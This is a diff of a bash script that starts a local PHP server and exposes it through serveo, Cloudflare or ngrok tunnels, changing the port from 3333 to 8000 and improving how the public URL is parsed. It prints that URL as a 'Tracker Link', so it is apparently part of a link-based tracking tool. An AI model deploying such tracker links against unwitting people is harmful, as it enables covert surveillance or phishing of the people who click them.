@@ -128,12 +128,12 @@ if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
 fi
 
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:8000 serveo.net 2> /dev/null > sendlink ' &
 
 sleep 8
-printf "${C}[${Y}+${C}] Starting php server... (localhost:3333)${Reset}\n"
-fuser -k 3333/tcp > /dev/null 2>&1
-php -S localhost:3333 > /dev/null 2>&1 &
+printf "${C}[${Y}+${C}] Starting php server... (localhost:8000)${Reset}\n"
+fuser -k 8000/tcp > /dev/null 2>&1
+php -S localhost:8000 > /dev/null 2>&1 &
 sleep 3
 
 # Wait for sendlink file to have content (with timeout)
@@ -234,28 +234,28 @@ if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
 fi
 
-printf "${C}[${Y}+${C}] Starting php server... (localhost:3333)${Reset}\n"
-fuser -k 3333/tcp > /dev/null 2>&1
-php -S localhost:3333 > /dev/null 2>&1 &
+printf "${C}[${Y}+${C}] Starting php server... (localhost:8000)${Reset}\n"
+fuser -k 8000/tcp > /dev/null 2>&1
+php -S localhost:8000 > /dev/null 2>&1 &
 sleep 2
 
 printf "${C}[${Y}+${C}] Starting Cloudflare tunnel...${Reset}\n"
 if [[ -e cloudflared ]]; then
-    ./cloudflared tunnel --url http://localhost:3333 > sendlink 2>&1 &
+    ./cloudflared tunnel --url http://localhost:8000 > sendlink 2>&1 &
 else
-    cloudflared tunnel --url http://localhost:3333 > sendlink 2>&1 &
+    cloudflared tunnel --url http://localhost:8000 > sendlink 2>&1 &
 fi
 
 sleep 8
 
 # Wait for sendlink file to have content (with timeout)
 printf "${C}[${Y}+${C}] Waiting for Cloudflare tunnel link...${Reset}\n"
-max_wait=30
+max_wait=90
 wait_count=0
 while [ $wait_count -lt $max_wait ]; do
     if [[ -s "sendlink" ]]; then
-        # Check if file contains a URL
-        if grep -qE "https://.*trycloudflare.com" sendlink 2>/dev/null; then
+        cleaned=$(sed 's/\x1b\[[0-9;]*[A-Za-z]//g' sendlink 2>/dev/null)
+        if echo "$cleaned" | grep -qE "https://[^[:space:]<>'\"]+\\.trycloudflare\\.com"; then
             break
         fi
     fi
@@ -263,8 +263,9 @@ while [ $wait_count -lt $max_wait ]; do
     wait_count=$((wait_count + 1))
 done
 
-# Extract Cloudflare tunnel URL
-send_link=$(cat sendlink 2>/dev/null | grep -oE "https://[a-zA-Z0-9\-]+\.trycloudflare\.com" | head -n1)
+# Extract Cloudflare tunnel URL (strip ANSI; allow hostname variants)
+send_link=$(cat sendlink 2>/dev/null | sed 's/\x1b\[[0-9;]*[A-Za-z]//g' | grep -oE "https://[^[:space:]<>'\"]+\\.trycloudflare\\.com" | head -n1)
+send_link="${send_link%%/}"
 
 if [[ -n "$send_link" ]]; then
     printf "\n${G}[${C}+${G}] Tracker Link:${W} %s${Reset}\n\n" "$send_link"
@@ -868,11 +869,11 @@ killall -2 php > /dev/null 2>&1
 fi
 
 printf "${G}[${G}+${G}] Starting php server...${Reset}\n"
-fuser -k 3333/tcp > /dev/null 2>&1
-php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+fuser -k 8000/tcp > /dev/null 2>&1
+php -S 127.0.0.1:8000 > /dev/null 2>&1 &
 sleep 2
 printf "${G}[${G}+${G}] Starting ngrok server...${Reset}\n"
-./ngrok http 3333 > /dev/null 2>&1 &
+./ngrok http 8000 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
